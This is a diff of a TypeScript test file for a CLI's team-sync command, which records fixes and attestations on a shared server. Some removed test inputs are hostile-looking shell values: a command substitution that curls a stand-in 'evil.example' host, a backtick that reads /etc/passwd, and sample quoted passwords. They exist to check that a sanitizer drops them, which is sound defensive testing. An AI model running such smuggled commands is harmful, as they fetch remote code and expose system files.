@@ -65,7 +65,7 @@ function ctx(): CommandContext {
 async function seedPairing(opts: {
   cwd: string;
   key: string;
-  /** `'sig_v1'` (default) or `'sig_v1_test'` (tenjin-agent#267). */
+  /** `'sig_v2'` (default, the error lane) or `'test'`. */
   kind?: string;
   coarseKey?: string | null;
   cmdHead?: string;
@@ -91,7 +91,7 @@ async function seedPairing(opts: {
     'sess-a',
     project,
     'machine-a',
-    opts.kind ?? 'sig_v1',
+    opts.kind ?? 'sig_v2',
     opts.key,
     opts.coarseKey ?? null,
     opts.cmdHead ?? 'pnpm',
@@ -175,20 +175,16 @@ interface Sent {
   body: Record<string, unknown> | undefined;
 }
 
+const FIX_ID = '11111111-1111-4111-8111-111111111111';
+
+/** The shelf's fix store. By default every upsert CREATES (201) and every
+ *  attest lands (201); a case that wants the holder rule, a 404 or a refusal
+ *  passes its own responder. */
 function shelfServer(
-  respond: (sent: Sent) => { status: number; json: unknown } = (req) => ({
-    // 201 for a create, 200 for a merge-update: what the shelf's routes return.
-    status: req.method === 'PUT' ? 200 : 201,
-    json: {
-      id: '11111111-1111-4111-8111-111111111111',
-      slug: 'fix-pnpm-test',
-      title: 'Fix: pnpm — ENOENT',
-      status: 'published',
-      price: '0',
-      url: `${TEAM}/a/team/fix-pnpm-test`,
-      tags: [],
-    },
-  }),
+  respond: (sent: Sent) => { status: number; json: unknown } = (req) =>
+    req.url.endsWith('/attest')
+      ? { status: 201, json: { attestations: 2 } }
+      : { status: 201, json: { fix: { id: FIX_ID }, created: true } },
 ): { fetch: typeof fetch; sent: Sent[] } {
   const sent: Sent[] = [];
   const fetchFn = (async (url: string | URL, init?: RequestInit) => {
@@ -217,19 +213,19 @@ describe('tenjin sync: team mode gate', () => {
   });
 });
 
-describe('tenjin sync: publishing an unsynced code-scoped pairing', () => {
-  it('POSTs a keyed, card-less, price-0 post and stamps synced_at + the post id', async () => {
+describe('tenjin sync: upserting a fix record', () => {
+  it('POSTs the fix payload — keys, files, head, versions — and stamps synced_at + the fix id', async () => {
     await writeTeamConfig();
     const id = await seedPairing({
       cwd: dir,
       key: 'fine-hash-abc',
       coarseKey: 'coarse-hash-def',
       cmdHead: 'pnpm',
-      cmd: 'pnpm test',
+      cmd: 'pnpm db:migrate',
       errorLine: 'Error: ENOENT: no such file or directory',
       errorFiles: ['widget.ts'],
-      fixCmd: 'pnpm test',
-      fixFiles: ['widget.ts'],
+      fixCmd: 'pnpm db:migrate',
+      fixFiles: ['src/widget.ts'],
       pkgVersions: { zod: '4.1.0' },
       status: 'unverified',
     });
@@ -238,59 +234,59 @@ describe('tenjin sync: publishing an unsynced code-scoped pairing', () => {
 
     const result = await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
 
-    expect(result.data).toMatchObject({ synced: 1, verified: 0, held: 0 });
+    expect(result.data).toMatchObject({ synced: 1, attested: 0, skipped: 0 });
     expect(sent).toHaveLength(1);
     const req = sent[0]!;
     expect(req.method).toBe('POST');
-    expect(req.url).toBe(`${TEAM}/api/posts`);
+    expect(req.url).toBe(`${TEAM}/api/fixes`);
     const body = req.body!;
-    expect(body.price).toBe('0');
-    expect(body.status).toBe('published');
-    expect(body.resource).toBeUndefined();
-    expect(typeof body.title).toBe('string');
-    expect(body.title as string).toMatch(/^Fix: pnpm — /);
-    expect((body.bodyMd as string).length).toBeLessThanOrEqual(300);
-    expect(body.bodyMd as string).toContain('pkg: zod@4.1.0');
 
-    // THE COARSE KEY ALWAYS GOES OUT beside the fine one when the checkout has
-    // a remote (tenjin-agent#249), salted with the slug and never with the url.
-    // The guard that used to drop it whenever the salt was falsy is what made a
-    // whole class of pairings fine-key-only; what replaced it is the no-remote
-    // return above, which publishes nothing at all rather than publishing under
-    // a salt that is not one.
-    const keys = body.keys as Array<{ kind: string; key: string; verified: boolean }>;
-    expect(keys).toEqual([
-      { kind: 'fingerprint', key: 'sig_v1:fine-hash-abc', verified: false },
+    // NO TITLE, NO BODY, NO PRICE, NO STATUS. A fix is a fact, not a piece:
+    // the whole record is keys, files, the head that passed, and versions.
+    expect(body).not.toHaveProperty('title');
+    expect(body).not.toHaveProperty('bodyMd');
+    expect(body).not.toHaveProperty('price');
+    expect(body).not.toHaveProperty('status');
+    expect(body.primary).toEqual({ kind: 'error', key: 'fine-hash-abc' });
+    expect(body.repo).toBe('github.com/acme/api');
+    expect(body.cmdHead).toBe('pnpm');
+    expect(body.fixFiles).toEqual(['src/widget.ts']);
+    expect(body.passedOnHead).toBe('pnpm');
+    expect(body.pkgVersions).toEqual({ zod: '4.1.0' });
+
+    // THE COARSE KEY GOES OUT SALTED, beside the fine one, and the command head
+    // rides along as metadata that is never itself a lookup key.
+    expect(body.keys).toEqual([
+      { kind: 'error', key: 'fine-hash-abc', tier: 'fine' },
       {
-        kind: 'fingerprint',
-        key: 'sig_v1c:' + teamCoarseKey('coarse-hash-def', 'github.com/acme/api'),
-        verified: false,
+        kind: 'error',
+        key: teamCoarseKey('coarse-hash-def', 'github.com/acme/api'),
+        tier: 'coarse',
       },
-      { kind: 'command_head', key: 'pnpm', verified: false },
+      { kind: 'command_head', key: 'pnpm', tier: 'coarse' },
     ]);
 
-    // The wallet's signer is only touched once the session key actually needs
-    // to sign something — not merely to describe the address.
+    // The wallet's signer is only touched once the write actually needs to sign.
     expect(getSignerCount()).toBeGreaterThan(0);
-
-    const row = await pairingRow(id);
-    expect(row.synced_at).not.toBeNull();
+    expect((await pairingRow(id)).synced_at).not.toBeNull();
   });
 
   /**
-   * A row the failure arm's sig_v1_test lane opened (tenjin-agent#267) carries
-   * that as its `kind`, and `keysFor` has to read it back: the wire prefix
-   * names which lane a hash belongs to, so `sig_v1` and `sig_v1_test` keys
-   * never collide on the shelf even though both are opaque hex hashes to it.
+   * A `test`-lane row keys on the runner's own identity, and its coarse key —
+   * file+suite — is LOCAL ONLY. Every failing test in a busy file shares it, so
+   * on a shared shelf it would answer "somebody fixed something in this file"
+   * to all of them; the resolve leg does not ask for it either, so the two
+   * sides agree.
    */
-  it('publishes sig_v1_test/sig_v1_test_c keys for a row opened by the test-identity lane', async () => {
+  it('sends kind test and NO coarse key for a row the test lane opened', async () => {
     await writeTeamConfig();
     await seedPairing({
       cwd: dir,
-      kind: 'sig_v1_test',
+      kind: 'test',
       key: 'test-fine-hash',
       coarseKey: 'test-coarse-hash',
       errorFiles: ['a.test.ts'],
+      fixFiles: ['src/a.ts'],
       status: 'unverified',
     });
     const { provider } = spyProvider();
@@ -299,194 +295,32 @@ describe('tenjin sync: publishing an unsynced code-scoped pairing', () => {
     const result = await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
 
     expect(result.data).toMatchObject({ synced: 1 });
-    const keys = sent[0]!.body!.keys as Array<{ kind: string; key: string; verified: boolean }>;
-    expect(keys).toEqual([
-      { kind: 'fingerprint', key: 'sig_v1_test:test-fine-hash', verified: false },
-      {
-        kind: 'fingerprint',
-        key: 'sig_v1_test_c:' + teamCoarseKey('test-coarse-hash', 'github.com/acme/api'),
-        verified: false,
-      },
-      { kind: 'command_head', key: 'pnpm', verified: false },
+    const body = sent[0]!.body!;
+    expect(body.primary).toEqual({ kind: 'test', key: 'test-fine-hash' });
+    expect(body.keys).toEqual([
+      { kind: 'test', key: 'test-fine-hash', tier: 'fine' },
+      { kind: 'command_head', key: 'pnpm', tier: 'coarse' },
     ]);
-    // Never the sig_v1 prefix for this row.
-    expect(JSON.stringify(keys)).not.toContain('"sig_v1:');
-    expect(JSON.stringify(keys)).not.toContain('"sig_v1c:');
+    expect(JSON.stringify(body.keys)).not.toContain('test-coarse-hash');
   });
 
-  /**
-   * tenjin-agent#252: the body used to write `Failed: ${row.cmd}` — the WHOLE
-   * scrubbed command line, pipeline tail and all — while the title and the
-   * `command_head` key both already used `cmdHead`. A scrubbed cwd renders as
-   * `/`, so a pipeline like this reads as a bogus `cd /` in the published body.
-   */
-  it('writes the body Failed: line off cmdHead, not the full scrubbed command', async () => {
+  it('derives passedOnHead from the head of the fix command, never the whole line', async () => {
     await writeTeamConfig();
     await seedPairing({
       cwd: dir,
       key: 'fine-hash-head',
-      coarseKey: 'coarse-hash-head',
-      cmdHead: 'pnpm',
-      cmd: 'cd / && pnpm vitest run src/commands/sync.test.ts | grep -B2 Error; echo ---SQL',
+      fixCmd: 'cd / && pnpm vitest run src/x.test.ts | grep -B2 Error',
       status: 'unverified',
     });
     const { provider } = spyProvider();
     const { fetch, sent } = shelfServer();
-
     await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
-
-    expect(sent).toHaveLength(1);
-    const bodyMd = sent[0]!.body!.bodyMd as string;
-    expect(bodyMd).toContain('Failed: pnpm');
-    expect(bodyMd).not.toContain('cd /');
-    expect(bodyMd).not.toContain('grep');
-    expect(bodyMd).not.toContain('---SQL');
+    expect(sent[0]!.body!.passedOnHead).toBe('pnpm');
   });
 
-  /**
-   * PR 277 review (tenjin-agent#252): the `Passed on:` line got the same
-   * whole-scrubbed-command treatment `Failed:` had — `fix_cmd` is the full
-   * successful command from `safeCommand(command)`, so the same `cd /`
-   * (a scrubbed cwd) and pipeline tail reached the published body through the
-   * second field even after `Failed:` was fixed to use `cmdHead`.
-   */
-  it('writes the body Passed on: line off a derived head, not the full scrubbed fix command', async () => {
+  it('stamps the fix id onto the pairing_fix link as our own', async () => {
     await writeTeamConfig();
-    await seedPairing({
-      cwd: dir,
-      key: 'fine-hash-fix-head',
-      coarseKey: 'coarse-hash-fix-head',
-      fixCmd: 'cd / && ; pnpm typecheck > $S/tc2.log',
-      status: 'unverified',
-    });
-    const { provider } = spyProvider();
-    const { fetch, sent } = shelfServer();
-
-    await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
-
-    expect(sent).toHaveLength(1);
-    const bodyMd = sent[0]!.body!.bodyMd as string;
-    expect(bodyMd).toContain('Passed on: pnpm');
-    expect(bodyMd).not.toContain('cd /');
-    expect(bodyMd).not.toContain('tc2.log');
-  });
-
-  /**
-   * PR 277 round-2 review, new-in-delta finding: `fixCmdHead` skipped past a
-   * `NAME=value` assignment word without noticing a quoted value had been
-   * split on whitespace, so the SECOND word of the quoted value became the
-   * published head — leaking a fragment of an operator secret even though the
-   * env var's own name (`MYSQL_PWD`, `SSH_PASSPHRASE`, `GIT_AUTHOR_NAME`)
-   * misses `SECRET_ASSIGN_RE` and so is never scrubbed at capture time. An
-   * unbalanced quote in the skipped word now bails the whole line rather than
-   * guessing at the next word.
-   */
-  it.each([
-    ['MYSQL_PWD="correct horse battery staple" pnpm test', 'horse'],
-    ['SSH_PASSPHRASE="open sesame now" pnpm build', 'sesame'],
-    ['GIT_AUTHOR_NAME="Jane Doe" pnpm test', 'Doe"'],
-  ])(
-    'drops the Passed on: line rather than leaking a quoted env value word: %s',
-    async (fixCmd, leaked) => {
-      await writeTeamConfig();
-      await seedPairing({
-        cwd: dir,
-        key: 'fine-hash-quoted-env',
-        coarseKey: 'coarse-hash-quoted-env',
-        fixCmd,
-        status: 'unverified',
-      });
-      const { provider } = spyProvider();
-      const { fetch, sent } = shelfServer();
-
-      await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
-
-      expect(sent).toHaveLength(1);
-      const bodyMd = sent[0]!.body!.bodyMd as string;
-      expect(bodyMd).not.toContain('Passed on:');
-      expect(bodyMd).not.toContain(leaked);
-    },
-  );
-
-  /**
-   * PR 277 round-2 review, nits under the same new function: an unguarded
-   * head shape let a command substitution, a backtick, a redirect target, or
-   * a runaway-length token straight through to the published body.
-   * `CMD_HEAD_SHAPE_RE` rejects anything that does not look like a plain
-   * command/basename.
-   */
-  it.each([
-    ['$(curl https://evil.example/x) pnpm test', '$(curl'],
-    ['`cat /etc/passwd` pnpm test', '`cat'],
-    ['>out.log 2>&1', '>out.log'],
-    ['a'.repeat(400), 'a'.repeat(400)],
-  ])(
-    'drops the Passed on: line for a head that does not look like a command: %s',
-    async (fixCmd, leaked) => {
-      await writeTeamConfig();
-      await seedPairing({
-        cwd: dir,
-        key: 'fine-hash-bad-shape',
-        coarseKey: 'coarse-hash-bad-shape',
-        fixCmd,
-        status: 'unverified',
-      });
-      const { provider } = spyProvider();
-      const { fetch, sent } = shelfServer();
-
-      await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
-
-      expect(sent).toHaveLength(1);
-      const bodyMd = sent[0]!.body!.bodyMd as string;
-      expect(bodyMd).not.toContain('Passed on:');
-      expect(bodyMd).not.toContain(leaked);
-    },
-  );
-
-  /** A normal unquoted env-style assignment ahead of the real command still
-   *  yields the plain command head — the quote and shape checks above must
-   *  not over-fire on the common case. */
-  it('still yields the command head past a normal unquoted env assignment', async () => {
-    await writeTeamConfig();
-    await seedPairing({
-      cwd: dir,
-      key: 'fine-hash-plain-env',
-      coarseKey: 'coarse-hash-plain-env',
-      fixCmd: 'FOO=bar pnpm test',
-      status: 'unverified',
-    });
-    const { provider } = spyProvider();
-    const { fetch, sent } = shelfServer();
-
-    await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
-
-    expect(sent).toHaveLength(1);
-    const bodyMd = sent[0]!.body!.bodyMd as string;
-    expect(bodyMd).toContain('Passed on: pnpm');
-  });
-
-  /**
-   * tenjin-agent#252: `publishPost`'s own response names the read URL of the
-   * post this machine just created, and `setLink` stashes it on the
-   * `pairing_post:<n>` link — which is what lets `inspect
-   * <resourceId>`/`read <resourceId>` resolve an id this CLI's own `tenjin
-   * sync` just published without it ever having been searched for (see
-   * lib/state-store.ts#findPairingCandidate and its resource-ref.test.ts
-   * coverage).
-   *
-   * Title and price are deliberately NOT stamped here any more (PR 277
-   * round-2 review, nit on state-store.ts:4132): a caller after display
-   * metadata for a resolved id fetches it live off `GET /api/posts/<id>/public`
-   * instead of trusting this local, possibly-stale bookkeeping.
-   */
-  it('stamps the published url onto the pairing_post link, without title/price', async () => {
-    await writeTeamConfig();
-    const id = await seedPairing({
-      cwd: dir,
-      key: 'fine-hash-url',
-      coarseKey: 'coarse-hash-url',
-      status: 'unverified',
-    });
+    const id = await seedPairing({ cwd: dir, key: 'fine-hash-url', status: 'unverified' });
     const { provider } = spyProvider();
     const { fetch } = shelfServer();
 
@@ -494,70 +328,197 @@ describe('tenjin sync: publishing an unsynced code-scoped pairing', () => {
 
     const store = await openStore(dir);
     if (store === null) throw new Error('no store');
-    const link = store.get(STORE_SQL.getState, ['', 'pairing_post:' + id]) as { value: string };
+    const link = store.get(STORE_SQL.getState, ['', 'pairing_fix:' + id]) as { value: string };
     store.close();
-    const parsedLink: unknown = JSON.parse(link.value);
-    expect(parsedLink).toMatchObject({
-      postId: '11111111-1111-4111-8111-111111111111',
-      own: true,
-      url: `${TEAM}/a/team/fix-pnpm-test`,
-    });
-    expect(parsedLink).not.toHaveProperty('title');
-    expect(parsedLink).not.toHaveProperty('price');
+    expect(JSON.parse(link.value)).toMatchObject({ fixId: FIX_ID, own: true });
   });
 
   /**
-   * NO REMOTE, NO SHELF (tenjin-agent#249, owner decision). '' is what stands in
-   * for a repo scope this checkout does not have, and it is not a salt:
-   * publishing under it would put every origin-less checkout on the team's
-   * shelf into ONE coarse bucket, and a coarse hit is rank 1 with no relevance
-   * check to run. So the run publishes NOTHING — not even the fine key, since
-   * the resolve leg does not ask from such a checkout either — and stamps
-   * nothing, so the rows are still there the day the checkout gains an origin.
+   * `created: false` is the server's holder rule answering: this machine
+   * ALREADY holds this fix for this (kind, key, repo), and nothing changed. The
+   * row is stamped either way — there is nothing left to do with it — and the
+   * counter says what actually happened rather than claiming a new record.
    */
-  it('publishes nothing and stamps nothing from a checkout with no origin', async () => {
+  it('counts a 200 created:false as skipped, not as newly recorded', async () => {
     await writeTeamConfig();
-    // A real checkout with no `origin`: its own `.git`, so the walk up stops
-    // here rather than reaching the fixture repo this tmpdir is.
+    const id = await seedPairing({ cwd: dir, key: 'fine-already-held', status: 'unverified' });
+    const { provider } = spyProvider();
+    const { fetch, sent } = shelfServer(() => ({
+      status: 200,
+      json: { fix: { id: FIX_ID }, created: false },
+    }));
+
+    const result = await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
+
+    expect(sent).toHaveLength(1);
+    expect(result.data).toMatchObject({ synced: 0, attested: 0, skipped: 1 });
+    expect((await pairingRow(id)).synced_at).not.toBeNull();
+  });
+
+  it('never sends a pairing outside code scope, local-only rows included', async () => {
+    await writeTeamConfig();
+    await seedPairing({ cwd: dir, key: 'user-scoped', scope: 'user', status: 'unverified' });
+    await seedPairing({ cwd: dir, key: 'amb-scoped', scope: 'ambiguous', status: 'unverified' });
+    // The row a runner that named no test opens: it has no durable key at all,
+    // so it must never reach the shelf.
+    await seedPairing({
+      cwd: dir,
+      kind: 'test',
+      key: 'local-only',
+      scope: 'local',
+      status: 'unverified',
+    });
+    const { provider } = spyProvider();
+    const { fetch, sent } = shelfServer();
+
+    const result = await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
+
+    expect(sent).toHaveLength(0);
+    expect(result.data).toMatchObject({ synced: 0, attested: 0 });
+  });
+
+  /** A fix record's whole payload is "these files changed"; one with an empty
+   *  list asserts nothing a teammate could act on. */
+  it('skips a row with no fix files rather than recording an empty payload', async () => {
+    await writeTeamConfig();
+    const id = await seedPairing({
+      cwd: dir,
+      key: 'fine-no-files',
+      fixFiles: [],
+      status: 'unverified',
+    });
+    const { provider } = spyProvider();
+    const { fetch, sent } = shelfServer();
+
+    const result = await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
+
+    expect(sent).toHaveLength(0);
+    expect(result.data).toMatchObject({ synced: 0, skipped: 1 });
+    expect((await pairingRow(id)).synced_at).not.toBeNull();
+  });
+});
+
+/**
+ * A PAIRING THIS MACHINE CLOSED BESIDE A TEAMMATE'S FIX. That close is the
+ * second, independent confirmation, and the shelf has no close endpoint — so
+ * this machine ATTESTS to their record with its own fix files rather than
+ * publishing a near-duplicate under its own name. Their fix is theirs: every
+ * write route is owner-scoped.
+ */
+describe("tenjin sync: a pairing closed beside a teammate's fix", () => {
+  async function seedTeammateLink(pairingId: number, over: Record<string, unknown> = {}) {
+    const store = await openStore(dir);
+    if (store === null) throw new Error('no store');
+    store.run(STORE_SQL.setState, [
+      '',
+      'pairing_fix:' + pairingId,
+      JSON.stringify({
+        fixId: '99999999-9999-4999-8999-999999999999',
+        origin: TEAM,
+        at: Date.now(),
+        closedAt: Date.now(),
+        status: 'unverified',
+        fixFiles: ['src/ours.ts'],
+        ...over,
+      }),
+      Date.now(),
+    ]);
+    store.close();
+  }
+
+  it('POSTs an attestation with THIS machine’s fix files and never upserts', async () => {
+    await writeTeamConfig();
+    const id = await seedPairing({
+      cwd: dir,
+      key: 'fine-teammate',
+      fixFiles: ['src/ours.ts'],
+      status: 'unverified',
+    });
+    await seedTeammateLink(id);
+    const { provider } = spyProvider();
+    const { fetch, sent } = shelfServer();
+
+    const result = await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
+
+    expect(result.data).toMatchObject({ synced: 0, attested: 1, skipped: 0 });
+    expect(sent).toHaveLength(1);
+    expect(sent[0]!.method).toBe('POST');
+    expect(sent[0]!.url).toBe(`${TEAM}/api/fixes/99999999-9999-4999-8999-999999999999/attest`);
+    expect(sent[0]!.body).toEqual({ fixFiles: ['src/ours.ts'] });
+    expect((await pairingRow(id)).synced_at).not.toBeNull();
+  });
+
+  /** A 400 `self_attest` means the link is stale and the fix is in fact ours:
+   *  nothing to do, and nothing to retry forever. */
+  it('stamps and skips when the server says the fix is already ours', async () => {
+    await writeTeamConfig();
+    const id = await seedPairing({ cwd: dir, key: 'fine-self', status: 'unverified' });
+    await seedTeammateLink(id);
+    const { provider } = spyProvider();
+    const { fetch, sent } = shelfServer(() => ({
+      status: 400,
+      json: { error: { code: 'self_attest' } },
+    }));
+
+    const result = await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
+
+    expect(sent).toHaveLength(1);
+    expect(result.data).toMatchObject({ synced: 0, attested: 0, skipped: 1 });
+    expect((await pairingRow(id)).synced_at).not.toBeNull();
+  });
+
+  /** The fix is gone from the shelf (deleted, or the link is stale): attesting
+   *  will 404 on every future run too, so one dead link must not block the
+   *  queue behind it. */
+  it('stamps and skips a 404, and reaches the rows behind it', async () => {
+    await writeTeamConfig();
+    const dead = await seedPairing({ cwd: dir, key: 'fine-dead', status: 'unverified' });
+    await seedTeammateLink(dead);
+    await seedPairing({ cwd: dir, key: 'fine-behind', status: 'unverified' });
+    const { provider } = spyProvider();
+    const { fetch, sent } = shelfServer((req) =>
+      req.url.endsWith('/attest')
+        ? { status: 404, json: { error: 'not_found' } }
+        : { status: 201, json: { fix: { id: FIX_ID }, created: true } },
+    );
+
+    const result = await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
+
+    expect(result.data).toMatchObject({ synced: 1, attested: 0, skipped: 1 });
+    expect(sent.map((r) => r.url)).toEqual([
+      `${TEAM}/api/fixes/99999999-9999-4999-8999-999999999999/attest`,
+      `${TEAM}/api/fixes`,
+    ]);
+    expect((await pairingRow(dead)).synced_at).not.toBeNull();
+  });
+});
+
+describe('tenjin sync: the repo salt', () => {
+  /**
+   * NO REMOTE, NO SHELF (tenjin-agent#249, owner decision). '' is what stands in
+   * for a repo scope this checkout does not have, and it is not a salt.
+   */
+  it('records nothing and stamps nothing from a checkout with no origin', async () => {
+    await writeTeamConfig();
     const bare = join(dir, 'bare');
     await mkdir(join(bare, '.git'), { recursive: true });
     await writeFile(join(bare, '.git', 'config'), '[core]\n\tbare = false\n');
-    const id = await seedPairing({
-      cwd: bare,
-      key: 'fine-hash-abc',
-      coarseKey: 'coarse-hash-def',
-      status: 'unverified',
-    });
+    const id = await seedPairing({ cwd: bare, key: 'fine-hash-abc', status: 'unverified' });
     const { provider, getSignerCount } = spyProvider();
     const { fetch, sent } = shelfServer();
 
     const result = await runSync(ctx(), { cwd: bare, provider, fetchImpl: fetch });
 
-    // Nothing on the wire, and the wallet was never asked to sign.
     expect(sent).toHaveLength(0);
     expect(getSignerCount()).toBe(0);
-    // The rows are counted as local, not as synced, held, skipped or pending.
-    expect(result.data).toMatchObject({
-      synced: 0,
-      verified: 0,
-      held: 0,
-      skipped: 0,
-      local: 1,
-      pending: 0,
-    });
-    // AND UNTOUCHED: `synced_at` is still NULL, so the day this checkout gains
-    // an origin the next run publishes them.
+    expect(result.data).toMatchObject({ synced: 0, attested: 0, skipped: 0, local: 1, pending: 0 });
     expect((await pairingRow(id)).synced_at).toBeNull();
   });
 
-  it('salts the coarse key with the repo slug when the checkout has an origin', async () => {
+  it('salts the coarse key with the repo slug, never with the url', async () => {
     await writeTeamConfig();
     const repoDir = join(dir, 'repo');
-    await mkdir(join(repoDir, '.git'), { recursive: true });
-    await writeFile(
-      join(repoDir, '.git', 'config'),
-      '[core]\n\tbare = false\n[remote "origin"]\n\turl = https://github.com/acme/widgets.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n',
-    );
+    await writeGitOrigin(repoDir, 'https://github.com/acme/widgets.git');
     await seedPairing({
       cwd: repoDir,
       key: 'fine-hash-xyz',
@@ -569,35 +530,20 @@ describe('tenjin sync: publishing an unsynced code-scoped pairing', () => {
 
     await runSync(ctx(), { cwd: repoDir, provider, fetchImpl: fetch });
 
-    const keys = sent[0]!.body!.keys as Array<{ kind: string; key: string }>;
-    const expected = 'sig_v1c:' + teamCoarseKey('coarse-hash-xyz', 'github.com/acme/widgets');
-    expect(keys.some((k) => k.key === expected)).toBe(true);
-    expect(expected).toBe(
-      'sig_v1c:' +
-        teamCoarseKey('coarse-hash-xyz', repoSlug('https://github.com/acme/widgets.git')),
+    const keys = sent[0]!.body!.keys as Array<{ kind: string; key: string; tier: string }>;
+    const coarse = keys.find((k) => k.kind === 'error' && k.tier === 'coarse')!.key;
+    expect(coarse).toBe(teamCoarseKey('coarse-hash-xyz', 'github.com/acme/widgets'));
+    expect(coarse).toBe(
+      teamCoarseKey('coarse-hash-xyz', repoSlug('https://github.com/acme/widgets.git')),
     );
-    // The SLUG, never the url: a teammate on the ssh remote publishes this key.
-    expect(keys.some((k) => k.key.startsWith('sig_v1c:'))).toBe(true);
-    expect(
-      keys.some(
-        (k) =>
-          k.key ===
-          'sig_v1c:' + teamCoarseKey('coarse-hash-xyz', 'https://github.com/acme/widgets.git'),
-      ),
-    ).toBe(false);
+    expect(coarse).not.toBe(
+      teamCoarseKey('coarse-hash-xyz', 'https://github.com/acme/widgets.git'),
+    );
   });
 
-  /**
-   * THE SYNC'S OWN WALK, AT THE SHARED BOUND (round-3 review of #256). This is
-   * the other half of the pair: the hook and the failure arm gate on the
-   * generated `originSlug`, and this leg finds the config through
-   * `findGitDir`. The two ran different bounds — 12 there, 64 here — so a
-   * checkout deeper than 12 was local-only to the hook and publishable here,
-   * and both now take the exported `GIT_WALK_MAX`. Twenty deep is past the old
-   * short bound and inside the shared one; the arm's side of the same depth is
-   * pinned in lib/push-scripts.test.ts.
-   */
-  it('publishes from a checkout twenty directories below the repo root', async () => {
+  /** ⚠ THE SAME BOUND THE FAILURE ARM WALKS (`GIT_WALK_MAX`): two bounds meant
+   *  a deep checkout read "no remote" in the hook and published here. */
+  it('records from a checkout twenty directories below the repo root', async () => {
     await writeTeamConfig();
     const repoDir = join(dir, 'deep');
     await writeGitOrigin(repoDir, 'https://github.com/acme/deep.git');
@@ -614,41 +560,24 @@ describe('tenjin sync: publishing an unsynced code-scoped pairing', () => {
 
     const result = await runSync(ctx(), { cwd: deep, provider, fetchImpl: fetch });
 
-    // Not local-only: the origin twenty levels up was found and salted with.
     expect(result.data).toMatchObject({ synced: 1, local: 0 });
-    const keys = sent[0]!.body!.keys as Array<{ kind: string; key: string }>;
+    const keys = sent[0]!.body!.keys as Array<{ key: string; tier: string }>;
     expect(
-      keys.some(
-        (k) =>
-          k.key ===
-          'sig_v1c:' +
-            teamCoarseKey('coarse-hash-deep', repoSlug('https://github.com/acme/deep.git')),
-      ),
+      keys.some((k) => k.key === teamCoarseKey('coarse-hash-deep', 'github.com/acme/deep')),
     ).toBe(true);
   });
 
-  /**
-   * ONE KEY FOR THE TWO TRANSPORTS OF ONE REPO (tenjin-agent#249). Before the
-   * slug, a teammate who cloned over ssh and a teammate who cloned over https
-   * published two different coarse keys for one project and never matched.
-   */
-  it('publishes the same coarse key from an ssh clone and an https clone', async () => {
+  it('records the same coarse key from an ssh clone and an https clone', async () => {
     await writeTeamConfig();
     const keyFor = async (origin: string, key: string): Promise<string> => {
       const repoDir = join(dir, `clone-${key}`);
-      await mkdir(join(repoDir, '.git'), { recursive: true });
-      await writeFile(join(repoDir, '.git', 'config'), `[remote "origin"]\n\turl = ${origin}\n`);
-      await seedPairing({
-        cwd: repoDir,
-        key,
-        coarseKey: 'coarse-shared',
-        status: 'unverified',
-      });
+      await writeGitOrigin(repoDir, origin);
+      await seedPairing({ cwd: repoDir, key, coarseKey: 'coarse-shared', status: 'unverified' });
       const { provider } = spyProvider();
       const { fetch, sent } = shelfServer();
       await runSync(ctx(), { cwd: repoDir, provider, fetchImpl: fetch });
-      const keys = sent[0]!.body!.keys as Array<{ kind: string; key: string }>;
-      return keys.find((k) => k.key.startsWith('sig_v1c:'))!.key;
+      const keys = sent[0]!.body!.keys as Array<{ kind: string; key: string; tier: string }>;
+      return keys.find((k) => k.kind === 'error' && k.tier === 'coarse')!.key;
     };
     const ssh = await keyFor('git@github.com:acme/widgets.git', 'fine-ssh');
     const https = await keyFor('https://github.com/acme/widgets', 'fine-https');
@@ -657,20 +586,11 @@ describe('tenjin sync: publishing an unsynced code-scoped pairing', () => {
     expect(fork).not.toBe(ssh);
   });
 
-  /**
-   * THE CHECKOUT IS THE ONE `--cwd` NAMES (tenjin-agent#249). `pairings.project`
-   * is `projectId(cwd)` over the cwd the hook payload carried, so a sync that
-   * scoped itself by `process.cwd()` read a different project's rows whenever
-   * the two strings differed — and the Stop hook, which counts with the payload
-   * cwd, would go on spawning a sync that saw nothing.
-   */
   it('reads the rows of the checkout --cwd names, not the process working directory', async () => {
     await writeTeamConfig();
     const elsewhere = join(dir, 'elsewhere');
     await mkdir(elsewhere, { recursive: true });
     await seedPairing({ cwd: elsewhere, key: 'fine-elsewhere', status: 'unverified' });
-    // A row for the directory the test process itself is in, which must not
-    // travel: it belongs to another checkout entirely.
     await seedPairing({ cwd: process.cwd(), key: 'fine-process-cwd', status: 'unverified' });
     const { provider } = spyProvider();
     const { fetch, sent } = shelfServer();
@@ -679,24 +599,15 @@ describe('tenjin sync: publishing an unsynced code-scoped pairing', () => {
 
     expect(result.data).toMatchObject({ synced: 1 });
     expect(sent).toHaveLength(1);
-    const keys = sent[0]!.body!.keys as Array<{ key: string }>;
-    expect(keys[0]!.key).toBe('sig_v1:fine-elsewhere');
+    expect(sent[0]!.body!.primary).toEqual({ kind: 'error', key: 'fine-elsewhere' });
   });
 
-  /**
-   * THE CASE THAT MADE IT MATTER: a checkout reached through a symlink. `getcwd`
-   * returns the RESOLVED path, so a child that inherited only the working
-   * directory hashed the real path while the failure arm had hashed the
-   * symlinked one the payload carried. Two project ids for one checkout, and
-   * every run reported "Nothing to sync."
-   */
   it('scopes by the symlinked path it was given, not by the path it resolves to', async () => {
     await writeTeamConfig();
     const real = join(dir, 'real-checkout');
     const link = join(dir, 'linked-checkout');
     await mkdir(real, { recursive: true });
     await symlink(real, link);
-    // The premise: the two strings are one directory and two project ids.
     expect(await realpath(link)).toBe(await realpath(real));
     expect(projectId(link)).not.toBe(projectId(await realpath(link)));
 
@@ -707,30 +618,19 @@ describe('tenjin sync: publishing an unsynced code-scoped pairing', () => {
     const result = await runSync(ctx(), { cwd: link, provider, fetchImpl: fetch });
 
     expect(result.data).toMatchObject({ synced: 1 });
